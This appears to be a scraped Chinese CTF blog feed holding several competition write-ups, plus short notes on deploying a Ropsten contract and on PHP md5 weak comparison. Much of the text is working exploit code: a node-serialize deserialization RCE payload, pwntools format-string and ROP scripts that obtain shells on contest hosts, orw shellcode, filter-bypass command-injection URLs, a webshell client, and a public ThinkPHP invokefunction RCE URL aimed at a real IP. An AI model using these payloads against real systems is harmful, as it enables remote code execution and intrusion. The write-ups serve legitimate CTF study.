const express = require(&#x27;express&#x27;);const path = require(&#x27;path&#x27;);const fs = require(&#x27;fs&#x27;);const cookieParser = require(&#x27;cookie-parser&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const serialize = require(&#x27;node-serialize&#x27;);const schedule = require(&#x27;node-schedule&#x27;);// Change working directory to /srvprocess.chdir(&#x27;/srv&#x27;);let rule1 = new schedule.RecurrenceRule();rule1.minute = [0, 3, 6 , 9, 12, 15, 18, 21, 24, 27, 30, 33, 36, 39, 42, 45, 48, 51, 54, 57];// 定时清除let job1 = schedule.scheduleJob(rule1, () =&gt; &#123;	fs.writeFile(&#x27;data.html&#x27;,&quot;#获取的数据信息\n&quot;,function(error)&#123;		console.log(&quot;wriet error&quot;)	&#125;);&#125;);const app = express();app.engine(&#x27;html&#x27;,require(&#x27;express-art-template&#x27;))app.use(express.static(&#x27;public&#x27;));app.use(cookieParser());app.use(bodyParser.json())app.use(bodyParser.urlencoded(&#123;extended: false&#125;))data_path = &quot;data.html&quot;;// Middleware to set default cookies for /admin routefunction setDefaultAdminCookies(req, res, next) &#123;    if (!req.cookies.username) &#123;        res.cookie(&#x27;username&#x27;, &#x27;normal&#x27;);    &#125;    if (!req.cookies.is_admin) &#123;        res.cookie(&#x27;is_admin&#x27;, &#x27;false&#x27;);    &#125;    next();&#125;//主页app.get(&#x27;/&#x27;, function(req, res) &#123;	res.sendFile(path.join(__dirname, &#x27;public/index.html&#x27;));&#125;);app.post(&#x27;/&#x27;,function(req, res)&#123;	fs.appendFile(&#x27;data.html&#x27;,JSON.stringify(req.body)+&quot;\n&quot;,function(error)&#123;		console.log(req.body)	&#125;);	res.sendFile(path.join(__dirname, &#x27;public/index.html&#x27;));&#125;);//后台管理app.get(&#x27;/admin&#x27;, setDefaultAdminCookies, function(req, res) &#123;	if(req.cookies.username !== &quot;admin&quot; || req.cookies.is_admin !== &quot;true&quot;)&#123;		res.redirect(&#x27;login&#x27;);	&#125;else if(req.cookies.username === &quot;admin&quot; &amp;&amp; req.cookies.is_admin === &quot;true&quot;)&#123;		res.render(&#x27;admin.html&#x27;,&#123;            datadir : data_path        &#125;);	&#125;&#125;);app.post(&#x27;/admin&#x27;, setDefaultAdminCookies, function(req, res) &#123;	if(req.cookies.username !== &quot;admin&quot; || req.cookies.is_admin !== &quot;true&quot;)&#123;		res.redirect(&#x27;login&#x27;);	&#125;else if(req.cookies.username === &quot;admin&quot; &amp;&amp; req.cookies.is_admin === &quot;true&quot;)&#123;		if(req.body.newname)&#123;			data_path = req.body.newname;			res.redirect(&#x27;admin&#x27;);		&#125;else&#123;			res.redirect(&#x27;admin&#x27;);		&#125;	&#125;&#125;);//已弃用的登录app.get(&#x27;/login&#x27;, function(req, res) &#123;	res.sendFile(path.join(__dirname, &#x27;public/login.html&#x27;));&#125;);app.post(&#x27;/login&#x27;, function(req, res) &#123;	if(req.cookies.profile)&#123;        var str = new Buffer(req.cookies.profile, &#x27;base64&#x27;).toString();        var obj = serialize.unserialize(str);		if (obj.username) &#123;            if (escape(obj.username) === &quot;admin&quot;) &#123;				res.send(&quot;Hello World&quot;);			&#125;		&#125;	&#125;else&#123;		res.sendFile(path.join(__dirname, &#x27;public/data&#x27;));	&#125;&#125;);//QQapp.get(&#x27;/qq&#x27;, function(req, res) &#123;	if(req.cookies.username !== &quot;admin&quot; || req.cookies.is_admin !== &quot;true&quot;)&#123;		res.redirect(&#x27;login&#x27;);	&#125;else if(req.cookies.username === &quot;admin&quot; &amp;&amp; req.cookies.is_admin === &quot;true&quot;)&#123;		res.sendFile(path.join(__dirname, data_path));	&#125;&#125;);app.listen(80, &#x27;0.0.0.0&#x27;);

在login的时候执行了serialize.unserialize(str)，可以打nodejs反序列化
&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;cat /this_is_your_ffflagg &gt; /tmp/1.txt&#x27;,function(error,stdout,stderr) &#123;console.log(stdout)&#125;);&#125;()&quot;&#125;


利用目录穿越拿到flag
fix提示：应修尽修，xss
没有修复成功
pwn-ezwpbreak非预期：phpinfo中直接搜flag
预期解：
php.ini里可以看到引用了myphp.so
extension=/home/myphp.so

ida分析
进入get_module函数，通过扩展函数表，可以看到myphp.so扩展导出了三个函数: myphp_test1,myphp_test2,phppwn

进入phppwn，发现会验证密钥后读取flag输出
但是这里len的类型是unsigned __int8，所以len=strlen(arg)&amp;0xff。同时密钥长度32，限制长度24，可以使用整数溢出进行绕过

exp
字符串长度&amp;0xff&lt;0x18 即可
hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

加上无字母rce
phppwn(&quot;hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;);

(~%8F%97%8F%8F%88%91)(~%97%A9%86%92%94%B1%92%8F%CF%B1%B2%CF%B1%9C%A6%BC%8C%88%B1%8B%B9%9D%AA%A5%8A%B8%CE%B8%A7%9D%88%AA%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E);



fix应该是需要修改字符串长度比较类型为长整型
pwn-cJSONbreak在delete功能中存在格式化字符串，利用格式化字符串可以获取shell

from pwn import *import jsondef all(name):    p.sendlineafter(b&quot;&gt;&quot;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;name:&#x27;,name)def get(name):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;name:&#x27;,name)def edit(name,data):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;name:&#x27;,name)    p.sendlineafter(b&#x27;len:&#x27;,str(len(data)).encode())    p.sendlineafter(b&#x27;data:&#x27;,data)def free(name):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;name:&#x27;,name)#p=process(&quot;./pwn&quot;)p=remote(&quot;10.1.123.16&quot;,9999)#gdb.attach(p,&#x27;bp $rebase(0x6b3b)&#x27;)libc=ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;./libc&quot;)e=ELF(&quot;./pwn&quot;)offset=20code=&#123;&quot;%25$p&quot;:1&#125;payload=json.dumps(code)p.sendlineafter(b&quot;size: &quot;,str(len(payload)).encode())p.sendlineafter(b&#x27;Json:&#x27;,payload.encode())free(&quot;%27$p&quot;)p.readuntil(&#x27;[&#x27;)d=int(p.readuntil(&#x27;]&#x27;,drop=1),16)libc.address=d-0x24083#libc.address=d-0x29d90free(&quot;%11$p&quot;)p.readuntil(&#x27;[&#x27;)d=int(p.readuntil(&#x27;]&#x27;,drop=1),16)e.address=d-0x6b04free(&quot;%10$p&quot;)p.readuntil(&#x27;[&#x27;)d=int(p.readuntil(&#x27;]&#x27;,drop=1),16)mainstack=d+8stack=d-0x78bin_sh=next(libc.search(b&#x27;/bin/sh\x00&#x27;))system=libc.sym[&#x27;system&#x27;]rdi=e.address+0x0000000000006ba3ret=rdi+1print(hex(mainstack))print(hex(stack))print(hex(libc.address))print(hex(rdi))print(hex(ret))payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)for i,v in enumerate(payload):    if v==0:        data=&quot;%22$hhn&quot;    else:        data=(&quot;%&quot;+str(v)+&quot;c%&quot;+&quot;22$hhn&quot;)    data=data.encode().ljust(16,b&#x27;a&#x27;)+p64(mainstack+i)    print(data)    free(data)retaddr=e.address+0x6b3afree((&quot;%&quot;+str(retaddr&amp;0xffff)+&quot;c%&quot;+&quot;22$hn&quot;).encode().ljust(16,b&#x27;a&#x27;)+p64(stack))pause()p.interactive()

fix将delete功能中的printf函数修改为puts

在edit功能中可能存在栈溢出，修改memcpy的第三个参数

pwn-baby_jitbreakshellcode中有8字节是自定义的,利用这8字节进行二次写，实现orw
from pwn import *context.arch=&#x27;amd64&#x27;def exec():    passshellcode=&quot;&quot;&quot;xor rdi,rdixchg rsi,rdxsyscall&quot;&quot;&quot;p=remote(&quot;10.1.123.17&quot;,9999)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)p.sendline(&quot;add &quot;+str(u64(asm(shellcode))))for i in range(0x20):    p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)    p.sendline(&quot;add &quot;+str(u64(asm(shellcode))))p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.sendlineafter(&#x27;offset?&#x27;,&#x27;0.2&#x27;)shellcode=shellcraft.open(&quot;flag&quot;)+shellcraft.read(3,0x100000+0x100,0x100)+shellcraft.write(1,0x100000+0x100,0x100)p.send(b&#x27;a&#x27;*0x8+asm(shellcode))p.interactive()

fix尝试了 修改指令单位大小，不使用浮点数进行偏移 没有防御成功
pwn-printf-masterbreak利用栈中指向args和envs的指针数据修改printf函数返回地址，进行多次格式化字符串，最终修改printf的返回地址为gadget获得shell
from pwn import *import random#context.log_level=&#x27;debug&#x27;def pwn(p):    libc=ELF(&quot;./libc-2.31.so&quot;)    gadget=0xe6af1    print(hex(gadget))    gdb.attach(p,&#x27;bp $rebase(0x1635)&#x27;)    p.sendlineafter(b&quot;&gt;&gt;&gt;&quot;,b&#x27;1&#x27;)    p.readuntil(&#x27;gift:&#x27;)    stack=int(p.readline(),16)    print_stack=stack-0x18    print(hex(print_stack))    payload=&quot;%c&quot;*14    payload+=&quot;%p&quot;+&quot;%&quot;+str(print_stack-14-14)+&#x27;c&#x27;+&#x27;%hn&#x27;    data=0xa9    subdata=(print_stack+26)&amp;0xff    data=data+0x100-subdata    payload+=&quot;%c&quot;*26+&quot;%&quot;+str(data)+&#x27;c&#x27;+&quot;%hhn&quot;#    p.sendline(&#x27;%p &#x27;*80)    p.sendlineafter(&#x27;name?&#x27;,payload)    p.readuntil(&#x27;0x&#x27;)    libc.address=int(p.read(12),16)-0x270b3    gadget=libc.address+gadget #3601    #libc.address=int(p.read(12),16)-0x24083    print(hex(libc.address))#    p.sendline(&#x27;%p &#x27;*60)#    p.interactive()    print_stack=print_stack-0x30    data=print_stack-0x30    payload=&#x27;%c&#x27;*8+&#x27;%&#x27;+str(data-8)+&#x27;c&#x27;+&#x27;%hn&#x27;    data=print_stack    subdata=print_stack-0x30+11    data=data+0x10000-subdata    payload+=&#x27;%c&#x27;*11+&#x27;%&#x27;+str(data)+&#x27;c&#x27;+&#x27;%hn&#x27;    data=print_stack+4-0x30    subdata=(print_stack+14)&amp;0xffff    data=data+0x10000-subdata    payload+=&quot;%c&quot;*4+&quot;%c&quot;*10+&quot;%&quot;+str(data)+&#x27;c&#x27;+&quot;%hn&quot;        data=0xa9    subdata=(print_stack+4+10-0x30)&amp;0xff    data=data+0x100-subdata    payload+=&quot;%c&quot;*10+&quot;%&quot;+str(data)+&#x27;c&#x27;+&#x27;%hhn&#x27;        print(payload)    print(hex(print_stack))    print(hex(gadget))    print(len(payload))    p.sendlineafter(&quot;name?&quot;,payload)    pause()    print_stack-=0x30    data=gadget&amp;0xffff    subdata=20    data=data+0x10000-subdata    payload=&quot;%c&quot;*20+&quot;%&quot;+str(data)+&quot;c&quot;+&quot;%hn&quot;    data=print_stack+2    subdata=(gadget+5)&amp;0xffff    data=data+0x10000-subdata    payload+=&quot;%c&quot;*5+&quot;%&quot;+str(data)+&quot;c&quot;+&quot;%hn&quot;    data=(gadget&gt;&gt;16)&amp;0xffff    subdata=(print_stack+2+26)&amp;0xffff    data=data+0x10000-subdata    payload+=&quot;%c&quot;*26+&#x27;%&#x27;+str(data)+&#x27;c&#x27;+&quot;%hn&quot;    data=(gadget&gt;&gt;32)&amp;0xffff    subdata=(gadget&gt;&gt;16)&amp;0xffff    data=data+0x10000-subdata    payload+=&quot;%&quot;+str(data)+&quot;c&quot;+&quot;%hn&quot;    print(payload)    info(&quot;thrid&quot;)    p.sendlineafter(&quot;name?&quot;,payload)    p.interactive()#    pause()p=process(&quot;./pwn1&quot;)pwn(p)while True:    break    try:        #p=remote(&quot;10.1.123.23&quot;,9999)        p=process(&quot;./pwn1&quot;)        gdb.attach(p,&#x27;bp $rebase(0x1635)&#x27;)        pwn(p)    except:        pass

fix在输出时使用了printf函数，修改为使用puts函数进行输出

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>awdp</tag>
        <tag>2024竞赛</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <url>/posts/8bf1ff96/</url>
    <content><![CDATA[Web远古特性web签到题，代码如下
&lt;?php// Present from glzjin :)highlight_file(__FILE__);$file = $_GET[&#x27;file&#x27;];if(preg_match(&#x27;/^hint\/hint.txt$/m&#x27;, $file)) &#123;    echo file_get_contents($file);&#125; else &#123;    echo &quot;Try again!&quot;;&#125;

主要是符合条件hint/hint.txt后换行直接读取文件，%0a绕过

Pwnsai_easypwn签到题分析文件

exp:
from pwn import *#p=process(&#x27;sai_easy_pwn&#x27;)p=remote(&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;,53100)str_bin=0x601098sys_add=0x400760pop_rdi=0x0000000000400b23p.send(b&#x27;a&#x27;*0x30)#p.send(b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(str_bin)+p64(sys_add))p.send(b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(0x40098e))#p.send(b&#x27;a&#x27;*0x30)#p.send(b&#x27;a&#x27;*0x8+p64(sys_add)+p64(0x6010e0)+p64(pop_rdi)+p64(str_bin)+p64(0x0000000000400aa4))p.interactive()

Reversepreprocess通过对c文件的分析发现实际上有一种类似base64的效果将字符串每三个字节按照六位一组进行分隔先进行取反然后对这六位二进制进行换位操作然后进行对照 如果不相同编译时就会报错
f=open(&#x27;data.txt&#x27;)import red=f.read()e=re.findall(&#x27; \^ (.+)&#x27;,d)data=&#x27;&#x27;for i in e:    cache=bin(int(i))[2:].zfill(6)    for j in [3,1,5,0,4,2]:        if cache[j]==&#x27;1&#x27;:            data+=&#x27;0&#x27;        else:            data+=&#x27;1&#x27;print(data)flag=int(data,2)import base64print(hex(flag)[2:].upper())print(base64.b16decode(hex(flag)[2:].upper().strip(&#x27;L&#x27;)))

最简单的逆向分析文件

a=[chr(0x76-50),chr(0x73-50),chr(0x85-50),chr(0x75-50),chr(0x86-50),chr(0x78-50),chr(0xAD-50),chr(0x6B-50),chr(0x97-50),chr(0x68-50),chr(0x98-50),chr(0x67-50),chr(0x64-50),chr(0x64-50),chr(0x62-50),chr(0x97-50),chr(0x68-50),chr(0x98-50),chr(0x6B-50),chr(0x6B-50),chr(0x96-50),chr(0x67-50),chr(0x62-50),chr(0x69-50),chr(0x95-50),chr(0x96-50),chr(0x65-50),chr(0x96-50),chr(0x6A-50),chr(0x69-50),chr(0x69-50),chr(0x65-50),chr(0x66-50),chr(0x97-50),chr(0x68-50),chr(0x98-50),chr(0x6A-50),chr(0x95-50),chr(0x68-50),chr(0xAF-50)]print(&#x27;&#x27;.join(a))


Cryptodecode_and_decode简单的base嵌套
import base64b1=base64.b64decodeb2=base64.b32decodef=open(&#x27;decode_and_decode.txt&#x27;)f=f.read()while 1:    try:        f=base64.b16decode(f)    except:        try:            f=base64.b32decode(f)        except:            try:                f=base64.b64decode(f)            except:                breakprint(f)

Miscasoul_lover从pdf中得到名字和生日，互相组合一下

密码为向晚0612
site_log分析文件发现evil.php文件比较可疑
f=open(&#x27;my_site.log&#x27;)d=f.readlines()for i in d:    if &#x27;evil.php&#x27; in i:        print(i)

使用脚本获取evil.php文件的日志

print(&#x27;&#x27;.join([chr(122),chr(105),chr(112),chr(32),chr(45),chr(114),chr(80),chr(32),chr(104),chr(101),chr(104),chr(101),chr(104),chr(101),chr(50),chr(51),chr(51),chr(95),chr(73),chr(103),chr(111),chr(116),chr(114),chr(111),chr(111),chr(116),chr(32),chr(102),chr(108),chr(97),chr(103),chr(46),chr(122),chr(105),chr(112),chr(32),chr(102),chr(108),chr(97),chr(103)]))


密码为hehehe233_Igotroot
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>在Rospten测试链部署一个合约</title>
    <url>/posts/19317a18/</url>
    <content><![CDATA[基础准备首先，需要一个钱包插件MetaMask,安装过程就不多说了，百度有很多教程选择一个在线ide
部署合约首先在默认目录下新建一个文件，注意以sol为后缀名
写上你的合约代码并选择编译器版本，编译成功后如图所示会出现编译成功的标志
最后部署合约，选择“Injected Web3”，表示我们要使用MetaMask注入的Web3环境，如果已正确连接MetaMask，可以看到“Ropsten (3) network”，表示已连接到Ropsten测试网。点击deploy后会弹出MetaMask的交易签名确认，确认后部署合约的交易即被发送至测试链
在MetaMask中查看合约
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>首届安徽省“追日杯”大学生网络安全挑战赛-wp</title>
    <url>/posts/45427b40/</url>
    <content><![CDATA[混了个三等奖，奖状至今未发（主办方跑路了。。。）
MISCcheckinflag{welcome_to_zrb@2021}
阵法的奥秘提示是8进制，观察到最后的数字是变化的
PING zrb.edisec.net: 56 data bytes64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.77 ms64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.78 ms64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.83 ms64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.77 ms64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.81 ms64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.81 ms...略
先提取出来与最小的76取余后转字符串最后两层base64
import base64a=[77,78,83,77,81,81,76,82,77,76,82,80,77,80,77,77,76,82,77,81,83,77,83,78,77,80,80,77,76,82,77,81,76,77,80,77,77,78,82,77,76,81,77,79,78,77,82,77,77,79,77,77,81,78,77,77,77,77,83,76,77,80,78,77,76,82,77,80,83,77,83,76,77,78,81,77,81,82,77,79,78,77,79,77,77,77,81,76,82,77,77,77,78,77,82,82,77,78,80,77,78,80,77,76,81,76,82,81,77,78,78,77,76,83,77,77,77,77,83,77,77,77,81,77,79,76,77,80,80,77,80,77,77,78,83,77,76,82,77,76,82,76,82,80,77,79,78,77,76,81,77,80,80,77,82,78,77,80,80,76,82,78,77,77,78,77,82,76,77,78,78,77,81,78,77,81,79,76,83,81]d=&#x27;&#x27;for i in a:    d=d+str(i%76)e=&#x27;&#x27;for i in range(0,len(d),3):    e=e+chr(int(d[i:i+3],8))z=base64.b64decode(e)z=base64.b64decode(z)print(z)


偷走的flag解压得到这是一个地址.txt和纸条.rar

小明去食堂吃饭，为了能在吃饭的时候有座位，他把自己的耳机和手机充电器放在桌子上。买饭回来后发现自己的东西不见了。以为被收走了。就去失物招领处询问。询问无果后，在QQ空间发现自己被挂了，说自己给学校丢人，用充电器占座，并把充电器放到了指定位置。小明找到以后发现了一串密文，只有解开密文，才能找到充电器的位置。你能帮助小明发现充电器被藏到哪里了吗。密文如下：%E2%A1%96%E2%A1%9C%E2%A1%91%E2%A1%97%E2%A1%8B%E2%A1%B1%E2%A1%83%E2%A0%81%E2%A1%94%E2%A1%95%E2%A1%AF%E2%A1%B6%E2%A1%82%E2%A1%9F%E2%A1%9D%E2%A1%AF%E2%A1%99%E2%A1%9D%E2%A1%80%E2%A1%9C%E2%A1%95%E2%A1%9D%3D

很明显的url编码，解密后得到⡖⡜⡑⡗⡋⡱⡃⠁⡔⡕⡯⡶⡂⡟⡝⡯⡙⡝⡀⡜⡕⡝=盲文编码，在线解密得到flag&#123;As1de_From_implem
用这个作为压缩包密码解压

恭喜你帮助小明找到充电器。但是他的耳机也不见了。通过查询监控发现耳机与充电器一起被拿走了。当他发现耳机时，只剩下一个进水的耳机、一摊水渍和一个被揉搓了好几遍的纸条，上面字迹已经被污染了，但隐约写着：********-I_forg1ve_y0u}。你能帮助小明发现被隐藏的字样吗。

vim中看到U+202C等字符，为0宽加密解密得到3ntat1on
最后拼接在一起，注意别把0宽字符复制进去flag&#123;As1de_From_implem3ntat1on-I_forg1ve_y0u&#125;
chess全自动解密脚本最后一关手动解即可
# -- coding=utf8 --from pwn import *io=remote(&quot;ctf.zrb.edisec.net&quot;,33741)win_data=&#x27;&#x27;if __name__ == &#x27;__main__&#x27;:	n=0	l=[[0]*3]*3	while 1:		if &#x27;499/500&#x27; in win_data :			p.interactive()		try:			io.sendlineafter(&#x27;x/y:&gt;&#x27;,&#x27;2/2&#x27;)			ob=io.recvuntil(&#x27;computer:&gt;&#x27;,timeout=0.2)			#ob=io.recvuntil(&#x27;player:&gt;&#x27;,timeout=2)			#ob=io.recvuntil(str(&#x27;player:&gt;&#x27;,timeout=2))			#ob=io.recvuntil(str(&#x27;player:&gt;&#x27;,timeout=2)).strip()			ob=io.recvuntil(&#x27;player:&gt;&#x27;,timeout=0.2).decode(&#x27;utf-8&#x27;)			ob=ob.strip()			#ob=ob.split(&#x27;/n&#x27;)			ob=ob.split(&#x27;\n&#x27;)			#ob=ob.split(&#x27;|&#x27;)			ob1=ob[0].split(&#x27;|&#x27;)			ob2=ob[4].split(&#x27;|&#x27;)			if &#x27;#&#x27; in ob1[0] or &#x27;#&#x27; in ob2[2]:				io.send(b&#x27;1/2\n&#x27;)				io.sendlineafter(&#x27;x/y:&gt;&#x27;,b&#x27;3/2&#x27;)			else:				io.send(b&#x27;2/1\n&#x27;)				io.sendlineafter(&#x27;x/y:&gt;&#x27;,b&#x27;2/3&#x27;)			try:				ob=io.recvuntil(&#x27;Can you win&#x27;,timeout=0.2)				if not ob:					raise Exception(&quot;123&quot;)				win_data=io.recvuntil(&#x27;*****&#x27;).decode(&#x27;utf-8&#x27;)			except:				try:					io.send(b&#x27;1/1\n&#x27;)					ob1=io.recvuntil(&#x27;repeat&#x27;,timeout=0.2)					if not ob1:						raise Exception(&quot;123&quot;)					io.send(b&#x27;1/3\n&#x27;)					io.sned(b&#x27;3/1\n&#x27;)				except:					try:						io.send(b&#x27;3/3\n&#x27;)						ob=io.recvuntil(&#x27;Can you win&#x27;,timeout=0.2)						if not ob:							raise Exception(&quot;123&quot;)						win_data=io.recvuntil(&#x27;*****&#x27;).decode(&#x27;utf-8&#x27;)					except:						#io.interactive()						code=0						for i in range(1,4):							if code:								break							for j in range(1,4):								try:									io.send(&#x27;%s/%s\n&#x27;%(i,j))									ob=io.recvuntil(&#x27;Can you win&#x27;,timeout=0.2)									if not ob:										raise Exception(&quot;123&quot;)									code=1									win_data=io.recvuntil(&#x27;*****&#x27;).decode(&#x27;utf-8&#x27;)									break								except:									pass					else:						print(&quot;第四层发送2/3，接收win正常&quot;)				else:					print(&quot;第三层接收repeat和发送正常&quot;)			print(&quot;第二层接收win正常&quot;)		except Exception as e:			if &#x27;of range&#x27; not in e.args[0]:				io.interactive()		else:			print(&quot;成功&quot;)	io.interactive()


WEBgotofly观察重定向看运气出flag
2_let_me_rce&lt;?phphighlight_file(__FILE__);$cmd=$_GET[&#x27;cmd&#x27;];if(!preg_match(&#x27;/sys|pass|exe|file|inc|cat| |\$|\?|\*|more|ca\t|nl|#| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?|\*|;|\||&amp;|\\\\/i&#x27;,$cmd))&#123;    eval(&quot;echo &#x27;&quot; . $cmd .&quot;&#x27;;&quot;);&#125;else&#123;    echo &quot;hacker&quot;;&#125;?&gt;
当时一打开就被这过滤吓住了，随便试了下就放弃了，赛后想想应该坚持一下，不要放弃看了wp学到了很多新的知识比如du命令也能列目录，用sed p读文件
赛后复现:没有过滤反引号和单双引号
列目录方法1：先用单引号闭合，然后反引号执行命令，空格用%09绕过
?cmd=&#x27;.`l&quot;&quot;s%09/`.&#x27;

列目录方法2：使用du -a /命令
?cmd=&#x27;.`du%09-a%09/`.&#x27;

读文件方法1：原理与列目录方法1一致
?cmd=&#x27;.`ta&quot;&quot;c%09/cccccreal_flag_here_ccccfffffffllllllllaggggg`.&#x27;

读文件方法2：使用sed p命令
?cmd=&#x27;.`sed%09p%09/cccccreal_flag_here_ccccfffffffllllllllaggggg%09`.&#x27;

伊泽瑞尔的php赛后复现WHT战队的exp
import requestsimport zlibimport reimport base64def x(t,k):  return &#x27;&#x27;.join([chr(ord(x)^ord(y)) for x,y in zip(t,k*(len(t)/len(k)+1))])session = requests.Session()# @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;cmd = zlib.compress(cmd)cmd = x(cmd,&quot;25ed1bcb&quot;)cmd = base64.b64encode(cmd)rawBody = &quot;423b0b7200f4&#123;cmd&#125;85fc5ff71c8e&quot;.format(cmd=cmd)print(rawBody)response = session.post(&quot;http://ctf.zrb.edisec.net:45140/index.php&quot;, data=rawBody)print(&quot;Response body: %s&quot; % response.content)res = re.findall(r&#x27;niGqOXD4rBhBWZ7t423b0b7200f4(.+)85fc5ff71c8e&#x27;,response.content)[0]# $r=@base64_encode(@x(@gzcompress($o),$k));res = base64.b64decode(res)res = x(res,&quot;25ed1bcb&quot;)res = zlib.decompress(res)print(res)



综合渗透综合渗透-FLAG1thinkphp框架简单一扫没有过滤且未修复漏洞用公开的payload打http://82.156.76.152:8077/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>追日杯</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中关于md5的一些总结</title>
    <url>/posts/ad669f62/</url>
    <content><![CDATA[MD5弱类型比较&lt;?phphighlight_file(__FILE__);error_reporting(0);$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;]))&#123;	if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])	&#123;		if ((md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;])))			echo &quot;ok&quot;;		else			echo &quot;nonono&quot;;	&#125;&#125;?&gt;

方法一：数组绕过
由于md5不能加密数组，在加密数组的时候会返回NULL，所以我们可以传入两个数组来绕过
方法二：科学计数法绕过
可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0
s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e7826013635392917798819384791622406107080e462097431906509019562988736854


